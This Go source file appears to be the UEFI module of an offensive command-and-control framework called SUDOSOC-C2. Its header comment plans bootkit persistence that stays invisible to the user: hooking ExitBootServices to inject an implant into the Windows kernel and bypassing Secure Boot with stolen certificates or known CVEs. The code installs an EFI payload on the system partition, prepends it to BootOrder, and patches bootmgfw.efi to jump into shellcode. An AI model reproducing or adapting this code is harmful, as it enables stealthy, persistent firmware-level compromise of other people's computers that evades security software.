package uefi

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	EFI System Partition (ESP) manipulation.

	The ESP is a FAT32 partition (type GUID {C12A7328-F81F-11D2-BA4B-00A0C93EC93B})
	that contains EFI applications, drivers, and boot loaders. Windows mounts
	it as a hidden volume accessible via its device path.

	Implant installation on the ESP:
	  1. Mount the ESP (assign a drive letter using mountvol.exe or raw API).
	  2. Copy our EFI application binary to \EFI\<vendor>\<name>.efi.
	  3. Create a UEFI boot variable (Boot####) pointing to it.
	  4. Prepend that entry to BootOrder.
	  5. Unmount the ESP.

	The EFI application we drop is a minimal UEFI stub that:
	  a) Loads the Ghost implant payload from a hidden file on the ESP or
	     reconstructs it from NVRAM variables.
	  b) Hooks ExitBootServices() so it can inject the implant into the
	     Windows kernel during the transition from UEFI to OS.
	  c) Chains to the original Windows Boot Manager (bootmgfw.efi) so the
	     OS boots normally — the user sees nothing.

	ExitBootServices hook:
	  When the OS loader calls ExitBootServices() to take ownership of the
	  system, our EFI driver intercepts it, maps a DLL into the loader's
	  address space, and patches the loader's import table. The DLL is then
	  loaded by ntoskrnl early in kernel init — before any security software.
	  This is the technique used by CosmicStrand (Kaspersky, 2022).

	Secure Boot interaction:
	  If Secure Boot is enabled and we are NOT in Setup Mode, we cannot
	  directly load unsigned EFI binaries. Options:
	  a) If we have a kernel driver (BYOVD), we can add our signing cert to
	     the db (Secure Boot allow database) via NVRAM write.
	  b) If the target uses Windows UEFI CA, we can sign our payload with a
	     stolen or generated cert that chains to a trusted CA (if we have one).
	  c) Target UEFI implementations with known Secure Boot bypass CVEs
	     (BootHole / Grub2 CVE-2020-10713, Baton Drop CVE-2022-21894, etc.)
	  The module detects Secure Boot state and reports it to the operator.
*/

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
)

// ESPInfo describes the EFI System Partition.
type ESPInfo struct {
	DevicePath  string // e.g. \\?\Volume{GUID}\
	DriveLetter string // e.g. "S:" (empty if not mounted)
	PartGUID    [16]byte
}

// FindESP locates the EFI System Partition by querying volume information.
func FindESP() (*ESPInfo, error) {
	// Enumerate volumes and find the one with FAT32 filesystem that
	// contains \EFI directory.
	volumeBuf := make([]uint16, 260)
	handle, err := windows.FindFirstVolume(&volumeBuf[0], uint32(len(volumeBuf)))
	if err != nil {
		return nil, fmt.Errorf("FindFirstVolume: %w", err)
	}
	defer windows.FindVolumeClose(handle)

	for {
		vol := windows.UTF16ToString(volumeBuf)
		if isESP(vol) {
			esp := &ESPInfo{DevicePath: vol}
			esp.DriveLetter = getMountPoint(vol)
			// {{if .Config.Debug}}
			log.Printf("[uefi] ESP found: %s mount=%s", vol, esp.DriveLetter)
			// {{end}}
			return esp, nil
		}
		if err := windows.FindNextVolume(handle, &volumeBuf[0], uint32(len(volumeBuf))); err != nil {
			break
		}
	}
	return nil, fmt.Errorf("EFI System Partition not found")
}

// isESP checks if the given volume path is the ESP by looking for \EFI\
// in the root and checking the filesystem type label.
func isESP(volumePath string) bool {
	// Get filesystem type.
	volPtr, _ := windows.UTF16PtrFromString(volumePath)
	var fsNameBuf [64]uint16
	var volFlags uint32
	if err := windows.GetVolumeInformation(volPtr, nil, 0, nil, nil,
		&volFlags, &fsNameBuf[0], 64); err != nil {
		return false
	}
	fs := windows.UTF16ToString(fsNameBuf[:])
	if !strings.EqualFold(fs, "FAT32") && !strings.EqualFold(fs, "FAT") {
		return false
	}
	// Check for \EFI directory.
	efiPath := strings.TrimRight(volumePath, `\`) + `\EFI`
	_, err := os.Stat(efiPath)
	return err == nil
}

// getMountPoint returns the first drive letter assigned to volumePath.
func getMountPoint(volumePath string) string {
	volPtr, _ := windows.UTF16PtrFromString(volumePath)
	buf := make([]uint16, 1024)
	var returned uint32
	if err := windows.GetVolumePathNamesForVolumeName(volPtr, &buf[0],
		uint32(len(buf)), &returned); err != nil {
		return ""
	}
	// buf contains NUL-separated paths; take the first.
	s := windows.UTF16ToString(buf[:returned])
	parts := strings.Split(s, "\x00")
	for _, p := range parts {
		p = strings.TrimSpace(p)
		if p != "" {
			return p
		}
	}
	return ""
}

// MountESP assigns a temporary drive letter to the ESP and returns the
// mount point path. Call UnmountESP when done.
func MountESP(esp *ESPInfo) (string, error) {
	if esp.DriveLetter != "" {
		return esp.DriveLetter, nil
	}
	// Find a free drive letter.
	letter := findFreeDriveLetter()
	if letter == "" {
		return "", fmt.Errorf("no free drive letters")
	}
	target := letter + `\`
	// mountvol <letter>: <volumepath>
	out, err := exec.Command("mountvol", target, esp.DevicePath).CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("mountvol: %w — %s", err, string(out))
	}
	esp.DriveLetter = target
	// {{if .Config.Debug}}
	log.Printf("[uefi] ESP mounted at %s", target)
	// {{end}}
	return target, nil
}

// UnmountESP removes the drive letter assigned by MountESP.
func UnmountESP(esp *ESPInfo) {
	if esp.DriveLetter == "" {
		return
	}
	exec.Command("mountvol", esp.DriveLetter, "/d").Run()
	esp.DriveLetter = ""
}

// InstallEFIApplication copies efiPayload bytes to \EFI\<vendor>\<filename>
// on the ESP and creates a boot variable pointing to it.
func InstallEFIApplication(esp *ESPInfo, vendor, filename string, efiPayload []byte, optionNum uint16, description string) error {
	mountPoint, err := MountESP(esp)
	if err != nil {
		return fmt.Errorf("mount ESP: %w", err)
	}

	// Create directory.
	dir := filepath.Join(mountPoint, "EFI", vendor)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("mkdir %s: %w", dir, err)
	}

	// Write EFI binary.
	dst := filepath.Join(dir, filename)
	if err := os.WriteFile(dst, efiPayload, 0644); err != nil {
		return fmt.Errorf("write EFI app: %w", err)
	}
	// {{if .Config.Debug}}
	log.Printf("[uefi] EFI app written to %s (%d bytes)", dst, len(efiPayload))
	// {{end}}

	// EFI path uses backslashes, no drive letter.
	efiPath := `\EFI\` + vendor + `\` + filename

	// Create UEFI boot variable.
	if err := CreateBootOption(optionNum, description, efiPath, esp.PartGUID); err != nil {
		return fmt.Errorf("create boot option: %w", err)
	}

	// Prepend to BootOrder.
	if err := PrependBootOption(optionNum); err != nil {
		return fmt.Errorf("prepend boot order: %w", err)
	}

	// {{if .Config.Debug}}
	log.Printf("[uefi] boot option Boot%04X installed, prepended to BootOrder", optionNum)
	// {{end}}
	return nil
}

// RemoveEFIApplication removes the EFI binary, boot variable, and BootOrder
// entry installed by InstallEFIApplication.
func RemoveEFIApplication(esp *ESPInfo, vendor, filename string, optionNum uint16) error {
	mountPoint, err := MountESP(esp)
	if err != nil {
		return err
	}
	path := filepath.Join(mountPoint, "EFI", vendor, filename)
	os.Remove(path)
	// Remove directory if empty.
	os.Remove(filepath.Join(mountPoint, "EFI", vendor))

	// Delete boot variable.
	varName := fmt.Sprintf("Boot%04X", optionNum)
	_ = DeleteNVRAM(varName, GUIDGlobalVariable)

	// Remove from BootOrder.
	order, err := ReadBootOrder()
	if err == nil {
		filtered := make([]uint16, 0, len(order))
		for _, v := range order {
			if v != optionNum {
				filtered = append(filtered, v)
			}
		}
		_ = WriteBootOrder(filtered)
	}
	return nil
}

// PatchBootManager patches Windows Boot Manager (bootmgfw.efi) on the ESP
// to load our shim before transferring control to the original loader.
// This is the "FinFisher" approach — patch the existing signed binary's
// code rather than adding a new unsigned one.
//
// patchOffset is the byte offset within bootmgfw.efi to overwrite.
// patchBytes is the replacement code (typically a JMP to our shellcode).
// shellcode is appended to a gap in the PE file's slack space.
func PatchBootManager(esp *ESPInfo, patchOffset int64, patchBytes, shellcode []byte) error {
	mountPoint, err := MountESP(esp)
	if err != nil {
		return err
	}

	bootmgrPath := filepath.Join(mountPoint, `EFI\Microsoft\Boot\bootmgfw.efi`)
	data, err := os.ReadFile(bootmgrPath)
	if err != nil {
		return fmt.Errorf("read bootmgfw.efi: %w", err)
	}

	// Back up original.
	_ = os.WriteFile(bootmgrPath+".bak", data, 0644)

	// Find slack space for shellcode (look for a zero-filled region of
	// sufficient size near the end of the last section).
	scOffset, err := findSlackSpace(data, len(shellcode))
	if err != nil {
		return fmt.Errorf("find slack space: %w", err)
	}

	// Patch: JMP rel32 from patchOffset to scOffset.
	rel32 := int32(int64(scOffset) - (patchOffset + 5))
	jmpInstr := []byte{0xE9,
		byte(rel32), byte(rel32 >> 8), byte(rel32 >> 16), byte(rel32 >> 24)}
	copy(patchBytes, jmpInstr)

	// Apply both patches.
	copy(data[patchOffset:], patchBytes)
	copy(data[scOffset:], shellcode)

	if err := os.WriteFile(bootmgrPath, data, 0644); err != nil {
		return fmt.Errorf("write patched bootmgfw.efi: %w", err)
	}
	// {{if .Config.Debug}}
	log.Printf("[uefi] bootmgfw.efi patched: jmp@0x%x → sc@0x%x", patchOffset, scOffset)
	// {{end}}
	return nil
}

// findSlackSpace locates a region of `size` consecutive zero bytes near the
// end of a PE image (typical padding between sections or after the last section).
func findSlackSpace(pe []byte, size int) (int, error) {
	zeroes := 0
	for i := len(pe) - 1; i >= 0; i-- {
		if pe[i] == 0 {
			zeroes++
			if zeroes >= size {
				return i, nil
			}
		} else {
			zeroes = 0
		}
	}
	return 0, fmt.Errorf("no slack space of %d bytes found", size)
}

func findFreeDriveLetter() string {
	used := make(map[string]bool)
	buf := make([]uint16, 512)
	n, _ := windows.GetLogicalDriveStrings(uint32(len(buf)), &buf[0])
	s := windows.UTF16ToString(buf[:n])
	for _, part := range strings.Split(s, "\x00") {
		if len(part) >= 2 {
			used[strings.ToUpper(part[:1])] = true
		}
	}
	for c := byte('Z'); c >= 'D'; c-- {
		letter := string([]byte{c})
		if !used[letter] {
			return letter + ":"
		}
	}
	return ""
}

// suppress unused import warning
var _ = unsafe.Pointer(nil)
